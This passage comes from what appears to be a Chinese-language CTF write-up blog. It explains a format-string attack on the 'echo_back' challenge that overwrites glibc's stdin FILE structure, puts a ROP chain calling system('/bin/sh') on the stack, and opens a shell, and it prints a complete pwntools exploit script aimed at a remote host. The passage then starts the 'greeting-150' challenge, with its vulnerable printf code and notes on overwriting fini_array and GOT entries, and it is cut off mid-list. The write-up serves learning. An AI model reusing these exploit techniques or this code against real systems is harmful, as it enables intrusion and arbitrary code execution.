<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0x7ffb6a2b08e0 &lt;_IO_2_1_stdin_&gt;:	0x00000000fbad208b	0x00007ffb6a2b0964<br>0x7ffb6a2b08f0 &lt;_IO_2_1_stdin_+16&gt;:	0x00007ffb6a2b0964	0x00007ffb6a2b0963<br>0x7ffb6a2b0900 &lt;_IO_2_1_stdin_+32&gt;:	0x00007ffb6a2b0963	0x00007ffb6a2b0963<br>0x7ffb6a2b0910 &lt;_IO_2_1_stdin_+48&gt;:	0x00007ffb6a2b0963	0x00007ffb6a2b0963 //IO_buf_base<br>0x7ffb6a2b0920 &lt;_IO_2_1_stdin_+64&gt;:	0x00007ffb6a2b0964	0x0000000000000000 //IO_buf_end<br>0x7ffb6a2b0930 &lt;_IO_2_1_stdin_+80&gt;:	0x0000000000000000	0x0000000000000000<br>0x7ffb6a2b0940 &lt;_IO_2_1_stdin_+96&gt;:	0x0000000000000000	0x0000000000000000<br>0x7ffb6a2b0950 &lt;_IO_2_1_stdin_+112&gt;:	0x0000000000000000	0xffffffffffffffff<br>0x7ffb6a2b0960 &lt;_IO_2_1_stdin_+128&gt;:	0x000000000a000000	0x00007ffb6a2b2790<br>0x7ffb6a2b0970 &lt;_IO_2_1_stdin_+144&gt;:	0xffffffffffffffff	0x0000000000000000<br>0x7ffb6a2b0980 &lt;_IO_2_1_stdin_+160&gt;:	0x00007ffb6a2b09c0	0x0000000000000000<br>0x7ffb6a2b0990 &lt;_IO_2_1_stdin_+176&gt;:	0x0000000000000000	0x0000000000000000<br>0x7ffb6a2b09a0 &lt;_IO_2_1_stdin_+192&gt;:	0x00000000ffffffff	0x0000000000000000<br>0x7ffb6a2b09b0 &lt;_IO_2_1_stdin_+208&gt;:	0x0000000000000000	0x00007ffb6a2af6e0<br></code></pre></td></tr></table></figure>

<p>先是stdin的位置,当前位于0x7ffb6a2b08e0</p>
<p>然后是_IO_buf_base，它位于0x7ffb6a2b08e0 + 0x8 * 7 &#x3D; 0x7ffb6a2b0918 ，它的值为0x00007ffb6a2b0963 ， 并且要知道，它的值相对_IO_2_1_stdin_的地址总是不变的，假如我们把_IO_buf_base的低一字节覆盖为0，那么他就变成了0x00007ffb6a2b0900 ，也就是0x7ffb6a2b08e0 + 0x8 * 4处，跑到了结构体内部去了，是结构体中的第5个数据处，也是_IO_write_base处，并且由于_IO_buf_end没变，那么我们可以从0x00007ffb6a2b0900处向后输入0x64-0x00 &#x3D; 0x64个字符，那么就能把_IO_buf_base和_IO_buf_end都覆盖成关键地址，就能绕过7个字符的输入限制,且可以实现write anything anywhere</p>
<p>先来覆盖_IO_buf_base的低1字节为0</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#modify _IO_buf_base</span><br>sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>p = p64(_IO_buf_base)<br>sl(p)<br>sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">7</span>))<br>p = <span class="hljs-string">&#x27;%16$hhn&#x27;</span> <span class="hljs-comment">#不打印,即个数为0</span><br>sl(p)<br></code></pre></td></tr></table></figure>

<p>接下来，就可以覆盖结构体里的一些数据了</p>
<p>对于_IO_buf_base之前的数据(_IO_write_base_IO_write_ptr, _IO_write_end)，最好原样的放回，不然不知道会出现什么问题，经过调试，发现它们的值都是0x83 + _IO_2_1_stdin_addr，然后接下来，覆盖_IO_buf_base和_IO_buf_end，将它设置为堆栈中的&amp;main ret, 然后即可实现写入数据时,就会向堆栈中写入数据,前提还需满足一些条件.</p>
<p>于是，payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#build payload to modify _IO_2_1_stdin struct</span><br>p = p64(_IO_2_1_stdin_ + <span class="hljs-number">0x83</span>) * <span class="hljs-number">3</span><br>p += p64(main_ret) + p64(main_ret + <span class="hljs-number">0x8</span> * <span class="hljs-number">3</span>)<br>sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>sa(<span class="hljs-string">&#x27;:&#x27;</span>, p) <span class="hljs-comment">#length:</span><br>sl(<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>在length:后面发送payload, 因为这个地方用到了scanf</p>
<p>现在，得绕过一个判断，这样调用scanf 输入数据时，才会往缓冲区写入输入的数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)  <span class="hljs-comment">//判断是否已经读完, 想要能写入缓冲数据,就得把让ptr &gt;= end,这样才能使新的数据重新读入到缓冲区里 </span><br>   <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;  <br></code></pre></td></tr></table></figure>

<p>之前，覆盖结构体数据时，后面执行了这一步，使得 fp-&gt;_IO_read_end +&#x3D; count 相当于fp-&gt;_IO_read_end +&#x3D; len(p)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;  <span class="hljs-comment">//重新设置新的 _IO_buf_base</span><br>....          ....<br>count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,  <span class="hljs-comment">//系统向_IO_buf_base指向的缓冲区写入读取的数据</span><br>          fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<span class="hljs-comment">//写入长度:fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</span><br>....          ....<br>fp-&gt;_IO_read_end += count; <span class="hljs-comment">//使 _IO_read_end指针向后移动</span><br></code></pre></td></tr></table></figure>

<p>下面为输入之前的_IO_2_1_stdin_</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0x7fa95326b8e0 &lt;_IO_2_1_stdin_&gt;:	0x00000000fbad208b	0x00007fa95326b901 //_IO_read_ptr<br>									//IO_read_end<br>0x7fa95326b8f0 &lt;_IO_2_1_stdin_+16&gt;:	0x00007fa95326b928	0x00007fa95326b900<br>0x7fa95326b900 &lt;_IO_2_1_stdin_+32&gt;:	0x00007fa95326b963	0x00007fa95326b963<br>0x7fa95326b910 &lt;_IO_2_1_stdin_+48&gt;:	0x00007fa95326b963	0x00007ffddf79fbe8<br>0x7fa95326b920 &lt;_IO_2_1_stdin_+64&gt;:	0x00007ffddf79fc00	0x0000000000000000<br></code></pre></td></tr></table></figure>

<p>而 getchar() 的作用是使fp-&gt;_IO_read_ptr + 1</p>
<p>由于在覆盖结构体后，scanf的后面有一个getchar，执行了一次，所以还需要调用len(p)-1次getchar()，使_IO_read_ptr &#x3D;&#x3D;  PIO_read_end</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#call getchar() make fp-&gt;_IO_read_ptr == fp-&gt;_IO_read_end</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(p) - <span class="hljs-number">1</span>):<br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>)<br>	sl(<span class="hljs-string">&#x27; &#x27;</span>)	<br></code></pre></td></tr></table></figure>

<p>调用 len(p) - 1次getchar()后, <em>IO_2_1_stdin</em> 如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; x /40gx &amp;_IO_2_1_stdin_<br>0x7f1a9a51f8e0 &lt;_IO_2_1_stdin_&gt;:	0x00000000fbad208b	0x00007f1a9a51f928 //_IO_read_ptr<br>                                    //IO_read_end<br>0x7f1a9a51f8f0 &lt;_IO_2_1_stdin_+16&gt;:	0x00007f1a9a51f928	0x00007f1a9a51f900<br>0x7f1a9a51f900 &lt;_IO_2_1_stdin_+32&gt;:	0x00007f1a9a51f963	0x00007f1a9a51f963<br>0x7f1a9a51f910 &lt;_IO_2_1_stdin_+48&gt;:	0x00007f1a9a51f963	0x00007fff14080e88<br>0x7f1a9a51f920 &lt;_IO_2_1_stdin_+64&gt;:	0x00007fff14080ea0	0x0000000000000000<br>0x7f1a9a51f930 &lt;_IO_2_1_stdin_+80&gt;:	0x0000000000000000	0x0000000000000000<br><br></code></pre></td></tr></table></figure>

<h2 id="构造rop链"><a href="#构造rop链" class="headerlink" title="构造rop链"></a>构造rop链</h2><p>然后再次输入的时候,输入的数据就会在stack中了,现在就可以构造rop链.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#build rop chail</span><br>sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>p = p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)<br>sla(<span class="hljs-string">&#x27;:&#x27;</span>, p) <span class="hljs-comment">#length:</span><br>sl(<span class="hljs-string">&#x27;&#x27;</span>)	<br></code></pre></td></tr></table></figure>

<p>下面为输入修改后的堆栈</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; stack 50<br>00:0000│ rsp  0x7fff92ceeed8 —▸ 0x55c9b5337ad4 ◂— movzx  eax, byte ptr [rbp - 0x10]<br>01:0008│ rsi  0x7fff92ceeee0 ◂— 0x0<br>02:0010│      0x7fff92ceeee8 ◂— 0x4a74f6baf7ec8d00<br>03:0018│ rbp  0x7fff92ceeef0 —▸ 0x7fff92ceef00 —▸ 0x7fff92ceef30 —▸ 0x55c9b5337d30 ◂— push   r15<br>04:0020│      0x7fff92ceeef8 —▸ 0x55c9b5337b43 ◂— pop    rbp<br>05:0028│      0x7fff92ceef00 —▸ 0x7fff92ceef30 —▸ 0x55c9b5337d30 ◂— push   r15<br>06:0030│      0x7fff92ceef08 —▸ 0x55c9b5337ccd ◂— mov    dword ptr [rbp - 0x14], eax<br>07:0038│      0x7fff92ceef10 —▸ 0x55c9b5337d30 ◂— push   r15<br>08:0040│      0x7fff92ceef18 ◂— 0xffffffda00000001<br>09:0048│      0x7fff92ceef20 —▸ 0x7f53670f8918 (_IO_2_1_stdin_+56) —▸ 0x7fff92ceef38 —▸ 0x55c9b5337d93 ◂— pop    rdi<br>0a:0050│      0x7fff92ceef28 ◂— 0x4a74f6baf7ec8d00<br>0b:0058│      0x7fff92ceef30 —▸ 0x55c9b5337d30 ◂— push   r15<br>0c:0060│      0x7fff92ceef38 —▸ 0x55c9b5337d93 ◂— pop    rdi //修改为pop_rdi _ret<br>0d:0068│      0x7fff92ceef40 —▸ 0x7f5366ec0d57 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */<br>0e:0070│      0x7fff92ceef48 —▸ 0x7f5366d79390 (system) ◂— test   rdi, rdi<br><br></code></pre></td></tr></table></figure>

<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>只需使main函数ret即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#get shell</span><br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br></code></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-comment"># Author: I0gan</span><br><span class="hljs-comment"># Team  : D0g3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import LibcSearcher</span><br><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span><br><span class="hljs-comment">#context.terminal = &#x27;konsole&#x27;</span><br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>exeFile  = <span class="hljs-string">&quot;echo_back&quot;</span><br>libFile  = <span class="hljs-string">&quot;./libc.so.6&quot;</span><br><br>remoteIp = <span class="hljs-string">&quot;111.198.29.45&quot;</span><br>remotePort = <span class="hljs-number">54180</span><br><br>LOCAL = <span class="hljs-number">1</span><br>LIBC  = <span class="hljs-number">1</span><br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>pd32  = <span class="hljs-keyword">lambda</span> x : p32(x).decode() <span class="hljs-comment">#python3 not surport str + bytes</span><br>pd64  = <span class="hljs-keyword">lambda</span> x : p64(x).decode()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(x)<br>db    = <span class="hljs-keyword">lambda</span>   : gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------Func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">eb</span>(<span class="hljs-params">length, text</span>):<br>	sl(text)<br><br><span class="hljs-comment">#--------------------------Exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br><br>	<span class="hljs-comment"># leaking libc base</span><br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">7</span>))<br>	p = <span class="hljs-string">&#x27;%19$p&#x27;</span><br>	sl(p)<br>	ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>	libc_start_main = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">240</span><br>	libc_base = libc_start_main - lib.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>	li(<span class="hljs-string">&#x27;libc_base:&#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>	sys_addr = libc_base + lib.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>	sh_addr  = libc_base + lib.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>	<br>	<span class="hljs-comment"># leaking elf base</span><br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">7</span>))<br>	p = <span class="hljs-string">&#x27;%14$p&#x27;</span><br>	sl(p)<br>	ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>	elf_base = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0xD30</span><br>	main_addr = elf_base + <span class="hljs-number">0xC6C</span><br>	pop_rdi_ret = elf_base + <span class="hljs-number">0xd93</span><br>	li(<span class="hljs-string">&#x27;elf_base:&#x27;</span> + <span class="hljs-built_in">hex</span>(elf_base))<br><br>	<span class="hljs-comment">#leaking main ret in stack</span><br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">7</span>))<br>	p = <span class="hljs-string">&#x27;%12$p&#x27;</span><br>	sl(p)<br>	ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>	main_ret = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) + <span class="hljs-number">0x8</span><br><br>	<br>	<span class="hljs-comment">#leaking IO_buf_base</span><br>	_IO_2_1_stdin_ = libc_base + lib.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>	_IO_buf_base = _IO_2_1_stdin_ + <span class="hljs-number">0x8</span> * <span class="hljs-number">7</span><br>	li(<span class="hljs-string">&#x27;_IO_buf_base&#x27;</span> + <span class="hljs-built_in">hex</span>(_IO_buf_base))<br>		<br>    <span class="hljs-comment">#modify _IO_buf_base</span><br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>	p = p64(_IO_buf_base)<br>	sl(p)<br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">7</span>))<br>	p = <span class="hljs-string">&#x27;%16$hhn&#x27;</span><br>	sl(p)<br><br>	<span class="hljs-comment">#build payload to modify _IO_2_1_stdin struct</span><br>	p = p64(_IO_2_1_stdin_ + <span class="hljs-number">0x83</span>) * <span class="hljs-number">3</span><br>	p += p64(main_ret) + p64(main_ret + <span class="hljs-number">0x8</span> * <span class="hljs-number">3</span>)<br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sa(<span class="hljs-string">&#x27;:&#x27;</span>, p) <span class="hljs-comment">#length:</span><br>	sl(<span class="hljs-string">&#x27;&#x27;</span>)<br>	<br>	<span class="hljs-comment">#call getchar() make fp-&gt;_IO_read_ptr == fp-&gt;_IO_read_end</span><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(p) - <span class="hljs-number">1</span>):<br>		sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>		sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>)<br>		sl(<span class="hljs-string">&#x27; &#x27;</span>)<br>	<br>	<span class="hljs-comment">#build rop chail</span><br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	p = p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, p) <span class="hljs-comment">#length:</span><br>	sl(<span class="hljs-string">&#x27;&#x27;</span>)<br>	<span class="hljs-comment">#db()</span><br><br>	<span class="hljs-comment">#get shell</span><br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br><br>	<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------Main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		exe = ELF(exeFile)<br>		<span class="hljs-comment">#io = exe.process()</span><br>		<span class="hljs-keyword">if</span> LIBC:<br>			lib = ELF(libFile)<br>			io = exe.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)<br>	<br>	<span class="hljs-keyword">else</span>:<br>		exe = ELF(exeFile)<br>		io = remote(remoteIp, remotePort)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			lib = ELF(libFile)<br>	<br>	exploit()<br>	finish()<br>    <br></code></pre></td></tr></table></figure>





<h1 id="greeting-150"><a href="#greeting-150" class="headerlink" title="greeting-150"></a>greeting-150</h1><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">Arch:     i386-32-little<br>RELRO:    No RELRO<br>Stack:    Canary found<br>NX:       NX enabled<br>PIE:      No PIE (0x8048000)<br></code></pre></td></tr></table></figure>

<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>字符串漏洞</p>
<p>源代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">char</span> s; <span class="hljs-comment">// [esp+1Ch] [ebp-84h]</span><br><span class="hljs-type">char</span> v5; <span class="hljs-comment">// [esp+5Ch] [ebp-44h]</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp+9Ch] [ebp-4h]</span><br><br>v6 = __readgsdword(<span class="hljs-number">0x14</span>u);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please tell me your name... &quot;</span>);<br><span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">getnline</span>(&amp;v5, <span class="hljs-number">0x40</span>) )<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Don&#x27;t ignore me ;( &quot;</span>);<br><span class="hljs-built_in">sprintf</span>(&amp;s, <span class="hljs-string">&quot;Nice to meet you, %s :)\n&quot;</span>, &amp;v5);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(&amp;s); #字符串漏洞<br></code></pre></td></tr></table></figure>



<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>由于程序中只有一个字符串漏洞, 执行字符串漏洞后结束,这时就需要覆盖fini_array为start函数进行再次执行程序同时修改strlen的got表为system plt地址.</p>
<p>简单介绍一下: fini_array, 在<code>main</code>函数前会调用<code>.init</code>段代码和<code>.init_arra</code>y段的函数数组中每一个函数指针。同样的，<code>main</code>函数结束后也会调用<code>.fin</code>i段代码和<code>.fini._arrary</code>段的函数数组中的每一个函数指针</p>
<h3 id="字符串漏洞设置大的值注意的地方"><a href="#字符串漏洞设置大的值注意的地方" class="headerlink" title="字符串漏洞设置大的值注意的地方"></a>字符串漏洞设置大的值注意的地方</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数<br>h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数<br></code></pre></td></tr></table></figure>

<ol>
<li>第一次%xc%hhn的时候，要扣掉前面摆放的address的长度。比如32位时，其前面会摆放4个地址，这个时候就是x需要减去4x4 &#x3D; 16.</li>
<li>之后每个%xc 必需扣掉前一个写入 byte 的值总字符数才会是这个写入需要的长度。比如 第一次写入值为 90 第二个写入 120 此时应为<code>%30c% offset$hhn</code></li>
